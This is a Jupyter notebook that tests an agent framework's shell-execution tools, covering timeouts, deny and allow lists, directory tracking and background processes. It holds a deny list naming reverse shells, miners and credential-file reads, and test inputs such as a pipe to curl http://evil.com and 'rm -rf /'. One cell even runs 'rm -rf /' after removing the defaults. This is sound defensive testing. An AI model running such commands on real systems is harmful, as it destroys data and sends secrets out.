# Shell Command Execution Tools - Interactive Testing Notebook

This notebook provides a comprehensive, hands-on testing environment for the RawAgents shell command execution tools.
Work through each section to verify the tools are functioning correctly and to understand their capabilities.

## What You'll Test

| Tool | Description |
|------|-------------|
| `bash()` | Execute shell commands with security validation, timeout, cd tracking, output truncation |
| `bash_output()` | Read incremental output from background processes |
| `kill_shell()` | Terminate running shell processes (SIGTERM/SIGKILL) |

## Supporting Components

| Component | Description |
|-----------|-------------|
| `ShellSecurityContext` | 159 deny patterns, allowlist mode, sandbox config, shell selection, timeout management |
| `ProcessManager` | Singleton registry for background processes with event-based output waiting |
| `ShellAuditLogger` | Structured JSON logging of all command executions and security events |
| `stream_output()` | Real-time async line-by-line output streaming |
| `execute_with_recovery()` | Automatic retry with error suggestions |

## Prerequisites

- Python 3.11+
- The `rawagents` package installed (`pip install -e .`)
- Jupyter with async support (IPython kernel)

---

## Section 1: Setup and Imports

Run this section first to set up the testing environment.

In [1]:
import asyncio
import os
import sys
from datetime import datetime
from pathlib import Path
from tempfile import TemporaryDirectory


print(f"Python Version: {sys.version}")
print(f"Test Started:   {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
print(f"Working Dir:    {os.getcwd()}")
print(f"Platform:       {sys.platform}")

Python Version: 3.13.8 (main, Oct  7 2025, 12:01:51) [Clang 16.0.0 (clang-1600.0.26.6)]
Test Started:   2026-02-08 22:31:22
Working Dir:    /Users/tawab/Projects/MediaLab/rawagents/src/rawagents/tools/builtin
Platform:       darwin


In [2]:
# Import all shell tools and security components
from rawagents.tools.builtin.shell import (
    SandboxNotAvailableError,
    # Security
    ShellSecurityContext,
    # Tools
    bash,
    bash_output,
    get_shell_security_context,
    is_docker,
    kill_shell,
    set_shell_security_context,
)
from rawagents.tools.builtin.shell._errors import (
    ErrorSeverity,
    ShellError,
    configure_audit_logging,
    execute_with_recovery,
    get_audit_logger,
    suggest_fix,
)

# Internal modules (for deeper exploration)
from rawagents.tools.builtin.shell._process_manager import (
    ProcessInfo,
    get_process_manager,
)
from rawagents.tools.builtin.shell._security import _DEFAULT_DENY_PATTERNS
from rawagents.tools.builtin.shell._utils import (
    stream_output,
    stream_with_timeout,
)


print("All imports successful!")
print("\nTools:          bash, bash_output, kill_shell")
print(f"Deny patterns:  {len(_DEFAULT_DENY_PATTERNS)}")
print(f"Docker env:     {is_docker()}")

All imports successful!

Tools:          bash, bash_output, kill_shell
Deny patterns:  167
Docker env:     False


In [4]:
# Create a temporary workspace
_temp_dir = TemporaryDirectory(prefix="rawagents_shell_test_")
WORKSPACE = Path(_temp_dir.name)

print(f"Test Workspace: {WORKSPACE}")

def cleanup_workspace():
    """Call this when done testing to clean up."""
    _temp_dir.cleanup()
    print("Workspace cleaned up!")

def reset_context(**kwargs):
    """Reset the security context with optional overrides."""
    defaults = dict(workspace=str(WORKSPACE))
    defaults.update(kwargs)
    ctx = ShellSecurityContext(**defaults)
    set_shell_security_context(ctx)
    return ctx

Test Workspace: /var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c


In [5]:
# Configure the security context -- REQUIRED before using any shell tools
ctx = reset_context()

print("ShellSecurityContext configured:")
print(f"  workspace:        {ctx.workspace}")
print(f"  deny_patterns:    {len(ctx.deny_patterns)} patterns")
print(f"  allow_patterns:   {ctx.allow_patterns}")
print(f"  default_timeout:  {ctx.default_timeout}ms ({ctx.default_timeout/1000:.0f}s)")
print(f"  max_timeout:      {ctx.max_timeout}ms ({ctx.max_timeout/1000:.0f}s)")
print(f"  shell_path:       {ctx.shell_path}")
print(f"  detected shell:   {ctx.get_shell()}")
print(f"  enable_sandbox:   {ctx.enable_sandbox}")
print(f"  env_file:         {ctx.env_file}")
print(f"  maintain_cwd:     {ctx.maintain_project_working_dir}")
print("\nReady to test!")

ShellSecurityContext configured:
  workspace:        /var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c
  deny_patterns:    167 patterns
  allow_patterns:   []
  default_timeout:  120000ms (120s)
  max_timeout:      600000ms (600s)
  shell_path:       None
  detected shell:   /bin/zsh
  enable_sandbox:   False
  env_file:         None
  maintain_cwd:     False

Ready to test!


In [6]:
# Helper functions for testing

def show_result(result: str, title: str = "Result", max_lines: int = 30):
    """Pretty-print a tool result."""
    lines = result.split('\n')
    is_error = result.startswith('Error')
    icon = "FAIL" if is_error else "OK"
    print(f"\n[{icon}] {title}")
    print("=" * 60)
    if len(lines) > max_lines:
        for line in lines[:max_lines]:
            print(line)
        print(f"... ({len(lines) - max_lines} more lines)")
    else:
        print(result)
    print("=" * 60)

def assert_success(result: str, msg: str = ""):
    """Assert that a tool call succeeded (no Error prefix)."""
    if result.startswith("Error"):
        raise AssertionError(f"Expected success but got: {result}\n{msg}")
    print(f"  PASS: {msg or 'Success'}")

def assert_error(result: str, expected_text: str = None, msg: str = ""):
    """Assert that a tool call returned an error string."""
    if not result.startswith("Error"):
        raise AssertionError(f"Expected error but got: {result}\n{msg}")
    if expected_text and expected_text.lower() not in result.lower():
        raise AssertionError(f"Expected '{expected_text}' in error but got: {result}")
    print(f"  PASS: {msg or 'Got expected error'}")

def assert_contains(result: str, text: str, msg: str = ""):
    """Assert that the result contains specific text."""
    if text not in result:
        raise AssertionError(f"Expected '{text}' in result but got: {result[:200]}")
    print(f"  PASS: {msg or f'Contains: {text[:40]}'}")

print("Helper functions defined!")

Helper functions defined!


---

## Section 2: Basic Command Execution (`bash`)

The `bash()` tool executes shell commands and returns their output as a string.

**Signature:**
```python
@tool
async def bash(
    command: Annotated[str, "The shell command to execute"],
    description: Annotated[str | None, "Description of what this command does"] = None,
    timeout: Annotated[int | None, "Timeout in milliseconds (max 600000)"] = None,
    run_in_background: Annotated[bool, "Run command in background, return PID"] = False,
    dangerously_disable_sandbox: Annotated[bool, "Override sandbox mode (use with extreme caution)"] = False,
) -> str
```

**Return Values:**
- Success with output: `"<stripped output>"`
- Success, no output: `"(no output)"`
- Non-zero exit code: `"Error: Command failed with exit code {N}\n{output}"`
- Security blocked: `"Error: Command blocked: ..."`

### 2.1 Simple Commands

In [7]:
# Simple echo command
result = await bash("echo 'Hello from the shell tools!'")
show_result(result, "echo command")
assert_success(result, "echo returns output")
assert_contains(result, "Hello from the shell tools!", "Output matches")


[OK] echo command
Hello from the shell tools!
  PASS: echo returns output
  PASS: Output matches


In [8]:
# Multi-line output
result = await bash("echo line1; echo line2; echo line3")
show_result(result, "Multi-line output")
assert_contains(result, "line1", "Has line1")
assert_contains(result, "line3", "Has line3")
print(f"  Lines: {len(result.strip().split(chr(10)))}")


[OK] Multi-line output
line1
line2
line3
  PASS: Has line1
  PASS: Has line3
  Lines: 3


In [9]:
# Working directory is set to workspace
result = await bash("pwd")
show_result(result, "pwd (should match workspace)")

# On macOS /var -> /private/var, so compare resolved paths
pwd_resolved = Path(result.strip()).resolve()
workspace_resolved = WORKSPACE.resolve()
assert pwd_resolved == workspace_resolved, f"{pwd_resolved} != {workspace_resolved}"
print("  PASS: Working directory matches workspace")


[OK] pwd (should match workspace)
/private/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c
  PASS: Working directory matches workspace


In [10]:
# Command with no output returns "(no output)"
result = await bash("true")
show_result(result, "Command with no output")
assert result == "(no output)", f"Expected '(no output)', got: {result!r}"
print("  PASS: Silent success returns '(no output)'")


[OK] Command with no output
(no output)
  PASS: Silent success returns '(no output)'


### 2.2 Error Handling

In [11]:
# Non-zero exit code
result = await bash("exit 42")
show_result(result, "Non-zero exit code")
assert_error(result, "exit code 42", "Reports exit code 42")


[FAIL] Non-zero exit code
Error: Command failed with exit code 42

  PASS: Reports exit code 42


In [12]:
# Command not found
result = await bash("nonexistent_command_xyz_123")
show_result(result, "Command not found")
assert_error(result, "exit code", "Returns error with exit code")
assert_contains(result, "not found", "Stderr mentions not found")


[FAIL] Command not found
Error: Command failed with exit code 127
/bin/sh: nonexistent_command_xyz_123: command not found
  PASS: Returns error with exit code
  PASS: Stderr mentions not found


In [13]:
# stderr is merged with stdout
result = await bash("echo stdout_line; echo stderr_line >&2")
show_result(result, "stdout + stderr merged")
assert_contains(result, "stdout_line", "Has stdout")
assert_contains(result, "stderr_line", "Has stderr (merged)")


[OK] stdout + stderr merged
stdout_line
stderr_line
  PASS: Has stdout
  PASS: Has stderr (merged)


In [14]:
# The description parameter is for audit logs, doesn't affect execution
result = await bash("echo test", description="Testing the description parameter")
show_result(result, "Command with description")
assert_success(result, "description doesn't affect execution")


[OK] Command with description
test
  PASS: description doesn't affect execution


### Try It Yourself: Basic Commands

Try running your own commands below. Some ideas:
- Get system info: `uname -a`, `whoami`, `uptime`
- Pipe commands: `echo hello | wc -c`
- Use variables: `X=42; echo "The answer is $X"`

In [15]:
# Your turn! Try your own commands here:
result = await bash("echo 'Replace me with your own command!'")
show_result(result, "Your command")


[OK] Your command
Replace me with your own command!


---

## Section 3: Timeout Handling

Commands have configurable timeouts with graceful termination:
- **Default timeout:** 120,000ms (2 minutes)
- **Maximum timeout:** 600,000ms (10 minutes)
- **On timeout:** SIGTERM to process group, wait 5s, then SIGKILL

Timeouts can be overridden via environment variables:
- `RAWAGENTS_BASH_DEFAULT_TIMEOUT_MS`
- `RAWAGENTS_BASH_MAX_TIMEOUT_MS`

In [16]:
# Check default timeout values
ctx = get_shell_security_context()
print(f"Default timeout: {ctx.default_timeout}ms ({ctx.default_timeout/1000:.0f}s)")
print(f"Max timeout:     {ctx.max_timeout}ms ({ctx.max_timeout/1000:.0f}s)")

# Validate timeout clamping
assert ctx.validate_timeout(None) == 120000, "None -> default"
print("  PASS: None -> default (120000ms)")

assert ctx.validate_timeout(0) == 120000, "0 -> default"
print("  PASS: 0 -> default (120000ms)")

assert ctx.validate_timeout(-1) == 120000, "negative -> default"
print("  PASS: -1 -> default (120000ms)")

assert ctx.validate_timeout(999999) == 600000, "over max -> clamped"
print("  PASS: 999999 -> clamped to max (600000ms)")

assert ctx.validate_timeout(5000) == 5000, "valid -> unchanged"
print("  PASS: 5000 -> unchanged (5000ms)")

Default timeout: 120000ms (120s)
Max timeout:     600000ms (600s)
  PASS: None -> default (120000ms)
  PASS: 0 -> default (120000ms)
  PASS: -1 -> default (120000ms)
  PASS: 999999 -> clamped to max (600000ms)
  PASS: 5000 -> unchanged (5000ms)


In [17]:
# Trigger a timeout with a short timeout on a long command
import time


start = time.monotonic()
result = await bash("sleep 30", timeout=500)  # 500ms timeout
elapsed = time.monotonic() - start

show_result(result, f"Timeout test (elapsed: {elapsed:.1f}s)")
assert_error(result, "timed out", "Command timed out")
assert elapsed < 10, f"Should not wait 30s, elapsed: {elapsed:.1f}s"
print(f"  PASS: Terminated in {elapsed:.1f}s (not 30s)")


[FAIL] Timeout test (elapsed: 0.5s)
Error: Command timed out after 0.5 seconds
  PASS: Command timed out
  PASS: Terminated in 0.5s (not 30s)


In [18]:
# Custom timeout context
ctx = reset_context(default_timeout=3000, max_timeout=10000)
print(f"Custom context: default={ctx.default_timeout}ms, max={ctx.max_timeout}ms")

assert ctx.validate_timeout(None) == 3000, "default is 3s"
print("  PASS: Default is now 3000ms")

assert ctx.validate_timeout(20000) == 10000, "clamped to 10s"
print("  PASS: 20000ms clamped to 10000ms")

# Reset to normal
reset_context()

Custom context: default=3000ms, max=10000ms
  PASS: Default is now 3000ms
  PASS: 20000ms clamped to 10000ms


ShellSecurityContext(workspace='/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c', deny_patterns=['rm -rf /*', 'rm -rf /', 'rm -rf ~/*', 'rm -rf ~', 'rm -rf .', 'rm -rf ..', 'rmdir /*', 'rm -rf /home/*', 'rm -rf /var/*', 'rm -rf /etc/*', 'rm -rf /usr/*', 'dd if=*', 'mkfs*', 'fdisk*', 'parted*', 'wipefs*', 'shred *', 'sudo *', 'sudo su*', 'su *', 'su -*', 'doas *', 'pkexec *', 'runas *', 'chmod +s *', 'chmod u+s *', 'chmod g+s *', 'chmod 777 /*', 'chmod -R 777 /*', 'chown -R * /*', 'chattr *', 'setenforce *', 'systemctl disable*', 'systemctl mask*', 'service * stop', 'git push --force*', 'git push -f*', 'git push *--force*', 'git push *-f *', 'git reset --hard*', 'git clean -fd*', 'git clean -f*', 'git checkout -- .', 'git restore .', 'git branch -D *', ':(){ :|:& };:', '*:(){ :|:& };:*', 'fork()', 'while true; do*', 'yes |*', 'cat ~/.bash_history', 'cat ~/.zsh_history', 'cat ~/.ssh/*', 'cat /etc/shadow', 'cat /etc/passwd', 'cat ~/.netrc', 'cat ~/.aws/*', '

---

## Section 4: Security - Deny Patterns

The shell tools validate every command against **159 deny patterns** across 17 categories before execution.

Pattern matching uses three methods:
1. **Full match:** `fnmatch(normalized_command, pattern)` -- for exact patterns
2. **Search match:** For `*`-prefixed patterns, searches within the command
3. **Segment analysis:** Splits on shell metacharacters (`;`, `&&`, `||`, `|`) and checks each segment

In [19]:
# View the deny pattern categories and count
print(f"Total deny patterns: {len(_DEFAULT_DENY_PATTERNS)}")
print("\nSample patterns by category:")

categories = {
    "Destructive":     [p for p in _DEFAULT_DENY_PATTERNS if p.startswith("rm ")],
    "Privilege esc":   [p for p in _DEFAULT_DENY_PATTERNS if "sudo" in p and not p.startswith("*")],
    "Crypto mining":   [p for p in _DEFAULT_DENY_PATTERNS if "xmrig" in p or "minerd" in p or "stratum" in p],
    "Reverse shells":  [p for p in _DEFAULT_DENY_PATTERNS if "dev/tcp" in p or "nc -e" in p],
    "Git dangerous":   [p for p in _DEFAULT_DENY_PATTERNS if p.startswith("git ")],
}

for cat, patterns in categories.items():
    print(f"\n  {cat} ({len(patterns)}):")
    for p in patterns[:3]:
        print(f"    - {p}")
    if len(patterns) > 3:
        print(f"    ... and {len(patterns) - 3} more")

Total deny patterns: 167

Sample patterns by category:

  Destructive (10):
    - rm -rf /*
    - rm -rf /
    - rm -rf ~/*
    ... and 7 more

  Privilege esc (2):
    - sudo *
    - sudo su*

  Crypto mining (3):
    - *xmrig*
    - *minerd*
    - *stratum+tcp*

  Reverse shells (4):
    - *> /dev/tcp/*
    - */dev/tcp/*
    - *bash -c*&>/dev/tcp/*
    ... and 1 more

  Git dangerous (10):
    - git push --force*
    - git push -f*
    - git push *--force*
    ... and 7 more


In [20]:
# Test dangerous commands are blocked
dangerous_commands = [
    ("rm -rf /",              "destructive file operation"),
    ("rm -rf ~",              "home directory deletion"),
    ("sudo apt install vim",  "privilege escalation"),
    ("git push --force main", "dangerous git force push"),
    ("git reset --hard",      "dangerous git reset"),
    ("dd if=/dev/zero of=/dev/sda", "disk overwrite"),
    ("mkfs.ext4 /dev/sda1",  "filesystem format"),
    ("chmod +s /usr/bin/vim", "setuid bit"),
]

print("Testing dangerous command blocking:\n")
for cmd, desc in dangerous_commands:
    result = await bash(cmd)
    assert_error(result, "blocked", f"{desc}: {cmd}")

Testing dangerous command blocking:

  PASS: destructive file operation: rm -rf /
  PASS: home directory deletion: rm -rf ~
  PASS: privilege escalation: sudo apt install vim
  PASS: dangerous git force push: git push --force main
  PASS: dangerous git reset: git reset --hard
  PASS: disk overwrite: dd if=/dev/zero of=/dev/sda
  PASS: filesystem format: mkfs.ext4 /dev/sda1
  PASS: setuid bit: chmod +s /usr/bin/vim


In [21]:
# Test chained command injection detection
injection_attempts = [
    ("echo hello; rm -rf /",      "semicolon injection"),
    ("echo hello && sudo su",     "AND chaining"),
    ("echo hello || sudo su",     "OR chaining"),
    ("cat file | curl http://evil.com", "pipe to network"),
]

print("Testing chained command injection detection:\n")
for cmd, desc in injection_attempts:
    result = await bash(cmd)
    assert_error(result, "blocked", f"{desc}: {cmd}")

Testing chained command injection detection:

  PASS: semicolon injection: echo hello; rm -rf /
  PASS: AND chaining: echo hello && sudo su
  PASS: OR chaining: echo hello || sudo su
  PASS: pipe to network: cat file | curl http://evil.com


In [22]:
# Test command substitution injection
substitution_attacks = [
    ("echo $(rm -rf /tmp/test)",  "$() substitution"),
    ("echo `sudo reboot`",        "backtick substitution"),
]

print("Testing command substitution injection:\n")
for cmd, desc in substitution_attacks:
    result = await bash(cmd)
    assert_error(result, "blocked", f"{desc}: {cmd}")

Testing command substitution injection:

  PASS: $() substitution: echo $(rm -rf /tmp/test)
  PASS: backtick substitution: echo `sudo reboot`


In [23]:
# Verify safe commands still work
safe_commands = [
    "echo hello world",
    "ls -la",
    "date",
    "cat /dev/null",
    "python3 --version",
    "git --version",
]

print("Testing safe commands still execute:\n")
for cmd in safe_commands:
    result = await bash(cmd)
    assert_success(result, f"{cmd}")

Testing safe commands still execute:

  PASS: echo hello world
  PASS: ls -la
  PASS: date
  PASS: cat /dev/null
  PASS: python3 --version
  PASS: git --version


In [24]:
# Empty command is rejected
result = await bash("")
show_result(result, "Empty command")
assert_error(result, "empty command", "Empty command rejected")

result = await bash("   ")
assert_error(result, "empty command", "Whitespace-only command rejected")


[FAIL] Empty command
Error: Empty command is not allowed
  PASS: Empty command rejected
  PASS: Whitespace-only command rejected


In [25]:
# Custom deny patterns
custom_ctx = reset_context(
    deny_patterns=["npm publish*", "docker push*"]
)
print(f"Custom deny patterns: {custom_ctx.deny_patterns}")

result = await bash("npm publish --access public")
assert_error(result, "blocked", "Custom pattern blocks npm publish")

result = await bash("echo hello")
assert_success(result, "Non-matching commands still work")

# Note: with custom deny list, the 159 defaults are REPLACED, not appended
result = await bash("rm -rf /")
# This would NOT be blocked since we replaced the deny list!
# (It would fail for other reasons since / doesn't exist as expected)
print("  NOTE: Custom deny_patterns REPLACE defaults, they don't append")

# Reset to defaults
reset_context()

Custom deny patterns: ['npm publish*', 'docker push*']
  PASS: Custom pattern blocks npm publish
  PASS: Non-matching commands still work
  NOTE: Custom deny_patterns REPLACE defaults, they don't append


ShellSecurityContext(workspace='/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c', deny_patterns=['rm -rf /*', 'rm -rf /', 'rm -rf ~/*', 'rm -rf ~', 'rm -rf .', 'rm -rf ..', 'rmdir /*', 'rm -rf /home/*', 'rm -rf /var/*', 'rm -rf /etc/*', 'rm -rf /usr/*', 'dd if=*', 'mkfs*', 'fdisk*', 'parted*', 'wipefs*', 'shred *', 'sudo *', 'sudo su*', 'su *', 'su -*', 'doas *', 'pkexec *', 'runas *', 'chmod +s *', 'chmod u+s *', 'chmod g+s *', 'chmod 777 /*', 'chmod -R 777 /*', 'chown -R * /*', 'chattr *', 'setenforce *', 'systemctl disable*', 'systemctl mask*', 'service * stop', 'git push --force*', 'git push -f*', 'git push *--force*', 'git push *-f *', 'git reset --hard*', 'git clean -fd*', 'git clean -f*', 'git checkout -- .', 'git restore .', 'git branch -D *', ':(){ :|:& };:', '*:(){ :|:& };:*', 'fork()', 'while true; do*', 'yes |*', 'cat ~/.bash_history', 'cat ~/.zsh_history', 'cat ~/.ssh/*', 'cat /etc/shadow', 'cat /etc/passwd', 'cat ~/.netrc', 'cat ~/.aws/*', '

### Try It Yourself: Security Patterns

Experiment with the security system:
- Try other dangerous commands to see if they're blocked
- Create your own custom deny patterns
- Test edge cases like command substitution or redirection

In [26]:
# Your turn! Test the security system:
# Try: await bash("your_test_command_here")
# Try creating custom deny patterns:
# custom = reset_context(deny_patterns=["your_pattern*"])
# await bash("your_command")

---

## Section 5: Security - Allowlist Mode

When `allow_patterns` is non-empty, the context switches to **allowlist-only mode**: only commands matching an allow pattern can execute. Deny patterns are still checked first.

In [27]:
# Enable allowlist mode: only git and echo commands allowed
ctx = reset_context(allow_patterns=["git *", "echo *", "python3 *"])
print(f"Allowlist mode: {ctx.allow_patterns}\n")

# Allowed commands work
result = await bash("echo allowed")
assert_success(result, "echo is allowed")

result = await bash("git --version")
assert_success(result, "git is allowed")

# Non-allowed commands are blocked
result = await bash("ls -la")
assert_error(result, "not in allowlist", "ls is not allowed")

result = await bash("cat /etc/hostname")
assert_error(result, "not in allowlist", "cat is not allowed")

# Deny patterns still apply even if in allowlist
result = await bash("git push --force main")
assert_error(result, "blocked", "git force push blocked even in allowlist")

# Reset
reset_context()

Allowlist mode: ['git *', 'echo *', 'python3 *']

  PASS: echo is allowed
  PASS: git is allowed
  PASS: ls is not allowed
  PASS: cat is not allowed
  PASS: git force push blocked even in allowlist


ShellSecurityContext(workspace='/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c', deny_patterns=['rm -rf /*', 'rm -rf /', 'rm -rf ~/*', 'rm -rf ~', 'rm -rf .', 'rm -rf ..', 'rmdir /*', 'rm -rf /home/*', 'rm -rf /var/*', 'rm -rf /etc/*', 'rm -rf /usr/*', 'dd if=*', 'mkfs*', 'fdisk*', 'parted*', 'wipefs*', 'shred *', 'sudo *', 'sudo su*', 'su *', 'su -*', 'doas *', 'pkexec *', 'runas *', 'chmod +s *', 'chmod u+s *', 'chmod g+s *', 'chmod 777 /*', 'chmod -R 777 /*', 'chown -R * /*', 'chattr *', 'setenforce *', 'systemctl disable*', 'systemctl mask*', 'service * stop', 'git push --force*', 'git push -f*', 'git push *--force*', 'git push *-f *', 'git reset --hard*', 'git clean -fd*', 'git clean -f*', 'git checkout -- .', 'git restore .', 'git branch -D *', ':(){ :|:& };:', '*:(){ :|:& };:*', 'fork()', 'while true; do*', 'yes |*', 'cat ~/.bash_history', 'cat ~/.zsh_history', 'cat ~/.ssh/*', 'cat /etc/shadow', 'cat /etc/passwd', 'cat ~/.netrc', 'cat ~/.aws/*', '

---

## Section 6: Working Directory Tracking

The shell tools track `cd` commands across executions, maintaining a persistent working directory. 

**Key rules:**
- Only updates on success (exit code 0)
- Supports: `cd`, `cd ~`, `cd -`, `cd "quoted path"`, `cd /path && other`
- Previous directory saved for `cd -` support
- `maintain_project_working_dir` option resets cwd after each command

In [28]:
# Create test directories
reset_context()
(WORKSPACE / "dir_a").mkdir(exist_ok=True)
(WORKSPACE / "dir_b").mkdir(exist_ok=True)
(WORKSPACE / "dir_a" / "subdir").mkdir(exist_ok=True)

# Start in workspace
result = await bash("pwd")
print(f"Starting in: {result.strip()}")

# cd to dir_a
result = await bash("cd dir_a")
assert_success(result)
result = await bash("pwd")
assert_contains(result, "dir_a", "Now in dir_a")

# Relative cd to subdir
result = await bash("cd subdir")
assert_success(result)
result = await bash("pwd")
assert_contains(result, "subdir", "Now in dir_a/subdir")

Starting in: /private/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c
  PASS: Success
  PASS: Now in dir_a
  PASS: Success
  PASS: Now in dir_a/subdir


In [29]:
# cd - returns to previous directory
result = await bash("cd -")
assert_success(result)
result = await bash("pwd")
assert_contains(result, "dir_a", "cd - returned to dir_a")
print(f"  Current: {result.strip()}")

AssertionError: Expected success but got: Error: Command failed with exit code 1
/bin/sh: line 0: cd: OLDPWD not set


In [30]:
# cd ~ goes to home directory
result = await bash("cd ~")
assert_success(result)
result = await bash("pwd")
home = str(Path.home())
print(f"  pwd: {result.strip()}")
print(f"  home: {home}")

# cd with no args also goes home
await bash("cd " + str(WORKSPACE))  # go back first
result = await bash("cd")
assert_success(result)
result = await bash("pwd")
print(f"  After bare cd: {result.strip()}")

  PASS: Success
  pwd: /Users/tawab
  home: /Users/tawab
  PASS: Success
  After bare cd: /Users/tawab


In [31]:
# Failed cd does NOT update the tracked directory
reset_context()

result = await bash("pwd")
before = result.strip()
print(f"Before: {before}")

result = await bash("cd /nonexistent_directory_xyz")
assert_error(result, msg="cd to nonexistent dir fails")

result = await bash("pwd")
after = result.strip()
print(f"After:  {after}")

assert Path(before).resolve() == Path(after).resolve(), "Directory unchanged after failed cd"
print("  PASS: Failed cd did not change working directory")

Before: /private/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c
  PASS: cd to nonexistent dir fails
After:  /private/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c
  PASS: Failed cd did not change working directory


In [32]:
# cd in chained commands -- only extracts cd target
reset_context()
(WORKSPACE / "chain_test").mkdir(exist_ok=True)

result = await bash("cd chain_test && echo 'now in chain_test'")
assert_success(result)
assert_contains(result, "now in chain_test", "Chained command ran")

result = await bash("pwd")
assert_contains(result, "chain_test", "cd tracked from chained command")

  PASS: Success
  PASS: Chained command ran
  PASS: cd tracked from chained command


In [33]:
# maintain_project_working_dir resets to workspace after each command
ctx = reset_context(maintain_project_working_dir=True)
print(f"maintain_project_working_dir: {ctx.maintain_project_working_dir}")

result = await bash("cd /tmp && pwd")
print(f"  Command output: {result.strip()}")

# Next command should be back in workspace
result = await bash("pwd")
pwd_resolved = Path(result.strip()).resolve()
assert pwd_resolved == WORKSPACE.resolve(), f"Expected workspace, got {pwd_resolved}"
print("  PASS: Automatically reset to workspace")

# Reset
reset_context()

maintain_project_working_dir: True
  Command output: /tmp
  PASS: Automatically reset to workspace


ShellSecurityContext(workspace='/var/folders/k0/y02lb3y56ys_56xwpxd8xg2r0000gn/T/rawagents_shell_test_yldqxs2c', deny_patterns=['rm -rf /*', 'rm -rf /', 'rm -rf ~/*', 'rm -rf ~', 'rm -rf .', 'rm -rf ..', 'rmdir /*', 'rm -rf /home/*', 'rm -rf /var/*', 'rm -rf /etc/*', 'rm -rf /usr/*', 'dd if=*', 'mkfs*', 'fdisk*', 'parted*', 'wipefs*', 'shred *', 'sudo *', 'sudo su*', 'su *', 'su -*', 'doas *', 'pkexec *', 'runas *', 'chmod +s *', 'chmod u+s *', 'chmod g+s *', 'chmod 777 /*', 'chmod -R 777 /*', 'chown -R * /*', 'chattr *', 'setenforce *', 'systemctl disable*', 'systemctl mask*', 'service * stop', 'git push --force*', 'git push -f*', 'git push *--force*', 'git push *-f *', 'git reset --hard*', 'git clean -fd*', 'git clean -f*', 'git checkout -- .', 'git restore .', 'git branch -D *', ':(){ :|:& };:', '*:(){ :|:& };:*', 'fork()', 'while true; do*', 'yes |*', 'cat ~/.bash_history', 'cat ~/.zsh_history', 'cat ~/.ssh/*', 'cat /etc/shadow', 'cat /etc/passwd', 'cat ~/.netrc', 'cat ~/.aws/*', '

---

## Section 7: Background Process Management

Start long-running commands in the background, read their output incrementally, and terminate them.

**Lifecycle:**
```
bash(cmd, run_in_background=True)  -->  bash_output(pid)  -->  kill_shell(pid)
     Returns PID immediately           Returns new output      Terminates process
```

**Key internals:**
- `ProcessManager` is a module-level singleton (OS processes are global)
- Each process has a 10,000-line FIFO buffer with `asyncio.Event` signaling
- `bash_output()` uses event-based waiting, not polling

In [34]:
# Start a background process
result = await bash(
    "for i in 1 2 3 4 5; do echo item$i; sleep 0.3; done",
    run_in_background=True,
)
show_result(result, "Start background process")
assert_contains(result, "Started background process with PID:", "Returns PID")

# Extract PID
pid = result.split("PID: ")[1].strip()
print(f"  PID: {pid}")


[OK] Start background process
Started background process with PID: 40071
  PASS: Returns PID
  PID: 40071


In [35]:
# Wait a moment then read output
await asyncio.sleep(0.5)

output = await bash_output(pid=pid, timeout=3000)
show_result(output, "First read (partial output)")
# Should have some items and show "running" status
assert_contains(output, "item", "Has some output")


[OK] First read (partial output)
item1
item2
item3
item4
item5

Process status: running
  PASS: Has some output


In [36]:
# Wait for process to complete and read remaining output
await asyncio.sleep(2)

output = await bash_output(pid=pid, timeout=2000)
show_result(output, "Second read (remaining output)")
# Should show completed status
assert_contains(output, "completed", "Process completed")


[OK] Second read (remaining output)
Process status: completed (exit code 0)
  PASS: Process completed


In [37]:
# Reading output for unknown PID
output = await bash_output(pid="99999")
show_result(output, "Unknown PID")
assert_error(output, "not found", "Unknown PID returns error")


[FAIL] Unknown PID
Error: Process not found
  PASS: Unknown PID returns error


### 7.1 Killing Processes

In [38]:
# Start a long-running process
result = await bash("sleep 300", run_in_background=True)
pid = result.split("PID: ")[1].strip()
print(f"Started long process: PID {pid}")

# Graceful kill (SIGTERM, then SIGKILL after 5s)
result = await kill_shell(pid=pid)
show_result(result, "Graceful kill")
assert_contains(result, "terminated successfully", "Process killed")

Started long process: PID 40818

[OK] Graceful kill
Process 40818 terminated successfully
  PASS: Process killed


In [39]:
# Force kill (immediate SIGKILL)
result = await bash("sleep 300", run_in_background=True)
pid = result.split("PID: ")[1].strip()
print(f"Started another long process: PID {pid}")

result = await kill_shell(pid=pid, force=True)
show_result(result, "Force kill")
assert_contains(result, "terminated successfully", "Force killed")

Started another long process: PID 40880

[OK] Force kill
Process 40880 terminated successfully
  PASS: Force killed


In [40]:
# Kill unknown PID
result = await kill_shell(pid="99999")
show_result(result, "Kill unknown PID")
assert_error(result, "not found", "Unknown PID returns error")


[FAIL] Kill unknown PID
Error: Process 99999 not found
  PASS: Unknown PID returns error


In [41]:
# Kill a process that already terminated naturally
result = await bash("echo quick_done", run_in_background=True)
pid = result.split("PID: ")[1].strip()
print(f"Started quick process: PID {pid}")

# Wait for it to finish on its own
await asyncio.sleep(1)

# Now try to kill it -- should report "already terminated"
result = await kill_shell(pid=pid)
show_result(result, "Kill already-terminated process")
assert_contains(result, "already terminated", "Reports already terminated")

Started quick process: PID 40905

[OK] Kill already-terminated process
Process 40905 already terminated
  PASS: Reports already terminated


In [42]:
# Full lifecycle: start -> read -> kill -> verify dead
print("Full background process lifecycle:\n")

# Start
result = await bash(
    "for i in $(seq 1 100); do echo line_$i; sleep 0.05; done",
    run_in_background=True,
)
pid = result.split("PID: ")[1].strip()
print(f"  1. Started: PID {pid}")

# Read some output
await asyncio.sleep(0.5)
output = await bash_output(pid=pid, timeout=1000)
lines_read = len([l for l in output.split('\n') if l.startswith('line_')])
print(f"  2. Read {lines_read} lines")

# Kill
